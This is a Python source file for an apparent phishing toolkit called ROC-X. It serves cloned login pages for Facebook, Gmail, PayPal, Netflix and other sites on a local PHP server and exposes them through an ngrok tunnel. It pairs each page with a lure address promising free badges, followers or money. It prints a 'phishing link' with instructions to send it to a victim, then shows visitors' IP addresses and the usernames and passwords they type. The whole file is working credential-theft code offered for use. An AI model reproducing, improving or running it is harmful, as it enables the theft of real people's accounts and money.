version="\t\t ★★★ ROC-X Phishing ★★★   "
#IMPORT
import getpass,time,os
import signal
import os,json


try:
	os.system("cd $HOME/roc-x/.roc-x && chmod +x ngrok2")
except :
	pass
#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"======================================================================================================================"
space=" "
logo=red+str("""
     8888888b.   .d88888b.   .d8888b.       Y88b   d88P 
     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P  
     888    888 888     888 888    888        Y88o88P   
     888   d88P 888     888 888        888888  Y888P    
     8888888P"  888     888 888        888888  d888b    
     888 T88b   888     888 888    888        d88888b   
     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b  
     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b""")





os.system("clear || cls")

notice=green+""

# Definition

def header():
	print(logo+cyan+"\n\n\n\t\tDeveloped By : Sanaur Asif\n\n"+green+str(version)+" \n\n"+end+line+"\n"+end)

def clear():
	os.system("clear || cls")
def tm(CMD):
	os.system(CMD)
	
clear()
header()
print(cyan+"\n\t\t[•] Checking The Requirements")
time.sleep(0.7)
try:
	import requests
	a=os.system("php --version")
	if a!=0:
		jssisjjs
except:
	os.system("clear")
	header()
	print(cyan+"\n  [°] Installing The Requirements. Allow Up to 10 minutes ")
	time.sleep(2)
	os.system("clear")
	notice=cyan+"\t\t[°] Installing The Requirements.. \n"
	header()
	notice=""
	print("\n")
	os.system("pip install requests && pkg install php -y")
import requests
	
if os.path.isdir(".roc-x")!=True:
	tm("mkdir -p .roc-x")
if os.path.isdir(".roc-x/www")==True:
	tm("rm -rf .roc-x/www")
	tm("mkdir -p .roc-x/www")
else:
	tm("mkdir -p .roc-x/www")

def reset_color():
	print(end)

def kill_pid():
	tm("killall php> /dev/null 2>&1")
	tm("killall ngrok> /dev/null 2>&1 || killall ngrok2> /dev/null 2>&1")

def banner():
	print(logo)

def banner_small():
	print(logo)
def msg_exit():
	clear()
	header()
	print(cyan+"\n\t [√] Have A Good Day ")

def about():
	print(cyan+"\n\n\tYoutube:"+yellow+"\n\n\thttps://www.youtube.com/c/RootOfCyber"+cyan+"\n\n\tFacebook:"+yellow+"\n\n\thttps://www.facebook.com/RootOfCyber"+cyan+"\n\n\tWhat\'s app:"+yellow+"\n\n\thttps://chat.whatsapp.com/JPTOWlsJhhgEVtzht4tAlr"+cyan+"\n\n\tTelegram:\n"+yellow+"https://t.me/joinchat/RScE4xF8TiQIOs2Z"+cyan+"\n\n\n\n\tContact Us:"+yellow+"\n\n\trootofcyber@gmail.com"+cyan+"\n\n\n\tDeveloped By "+yellow+"Sanaur Asif"+cyan+"\n\tFB:"+yellow+" https://fb.com/sanaur.asif.72")


HOST='127.0.0.1'
PORT='8080'

def setup_site(website):
	HOST='127.0.0.1'
	PORT='8080'
	clear()
	header()
	print(cyan+"\n\n [•°•°] Copying Files for : "+yellow+website)
	tm("cp -rf .sites/"+website+"/* .roc-x/www")
	tm("cp -f .sites/ip.php .roc-x/www/")
	print(cyan+"\n [•°•°] Staring Server at : "+yellow+"127.0.0.1:8080")
	tm("cd .roc-x/www && php -S 127.0.0.1:8080> /dev/null 2>&1 &")


clear ()
header()
print("\n\n"+red+" [01] "+yellow+" Facebook"+red+"\n [02] "+yellow+" Twitter"+red+"\n [03] "+yellow+" Instagram"+red+"\n [04] "+yellow+" Gmail"+red+"\n [05] "+yellow+" Snapchat"+red+"\n [06] "+yellow+" Linkedin"+red+"\n [07] "+yellow+" Netflix"+red+"\n [08] "+yellow+" TikTok"+red+"\n [09] "+yellow+" Yahoo"+red+"\n [10] "+yellow+" Paypal"+red+"\n [11] "+yellow+" Back to ROC-X")

main_opt=str(input(blue+"\n[>] Select Your Option : "+yellow))

if main_opt=="01" or main_opt=="1":
	website="facebook"
	mask='http://blue-verified-badge-for-facebook-free'
elif main_opt=="2" or main_opt=="02":
	website="twitter"
	mask='http://get-blue-badge-on-twitter-free'
elif main_opt=="3" or main_opt=="03":
	website="instagram"
	mask='http://get-unlimited-followers-for-instagram'
elif main_opt=="4" or main_opt=="04":
	website="google"
	mask='http://get-unlimited-google-drive-free'
elif main_opt=="5" or main_opt=="05":
	website="snapchat"
	mask='http://view-locked-snapchat-accounts-secretly'
elif main_opt=="6" or main_opt=="06":
	website="linkedin"
	mask='http://get-a-premium-plan-for-linkedin-free'
elif main_opt=="7" or main_opt=="07":
	website="netflix"
	mask='http://upgrade-your-netflix-plan-free'
elif main_opt=="8" or main_opt=="08":
	website="tiktok"
	mask='http://tiktok-free-liker'
elif main_opt=="9" or main_opt=="09":
	website="yahoo"
	mask='http://grab-mail-from-anyother-yahoo-account-free'
elif main_opt=="10":
	website="paypal"
	mask='http://get-500-usd-free-to-your-acount'
elif main_opt=="11":
	os.system("python main2.py")
else:
	os.system("python main2.py")



kill_pid()
setup_site(website)

print(cyan+"\n [•°•°] Trying to Forward port via Ngrok")
tm("./.roc-x/ngrok2 http 127.0.0.1:8080> /dev/null 2>&1 &")
time.sleep(2)
clear()
header()
print("\n\n"+cyan+" [•] Trying To Generate Link....\n")
stchck=0
import requests
while True:
	try:
		r=requests.get("http://localhost:4040/status",timeout=15)
	except:
		status="error"
		break
	at=r.text
	try:
		ustrt=int(at.find('command_line'))
		uend=int(at.find("Proto"))
		if ustrt==-1 or uend==-1:
			wuwuw
		flink=at[ustrt+26:uend-5]
		status="ok"
		break
	except:
		if stchck<3:
			stchck+=1
			time.sleep(8)
			continue
		else:
			status="error"
			break
if status=="ok":
	print(green+" [✓] Your Phishing Link : "+yellow+flink+"\n")
elif status=="error":
	print(red+" [×] Unable to Generate Link ! Follow Steps : \n"+cyan+"\n\t [1] Open Any Browser\n\t [2] Go To : "+yellow+" https://localhost:4040/status\n\t"+cyan+" [3] Find The URL , Send to Your Victim\n\n\n")
ab=1

while True:
	if os.path.isfile(".roc-x/www/ip.txt")==True:
		time.sleep(0.75)
		tr=open(".roc-x/www/ip.txt","r")
		ip2=tr.readline()
		ip=tr.readline().strip("IP:")
		print(cyan+"\n [>] A User Visited the Site From IP : "+yellow+ip)
		tr.close()
		tm("rm -rf  .roc-x/www/ip.txt")
		time.sleep(0.75)
	if os.path.isfile(".roc-x/www/usernames.txt")==True:
		    time.sleep(0.75)
		    tr2=open(".roc-x/www/usernames.txt","r")
		    log2=tr2.readline()
		    start=int(log2.find("Username:"))
		    end=int(log2.find("Pass:"))
		    print(green+"\n [✓] A User Logged In : \n")
		    print(cyan+"\t [>] Login    : "+green+log2[start+9:end])
		    print(cyan+"\t [>] Password : "+green+log2[end+5:])
		    tr2.close()
		    tm("rm -rf  .roc-x/www/usernames.txt")
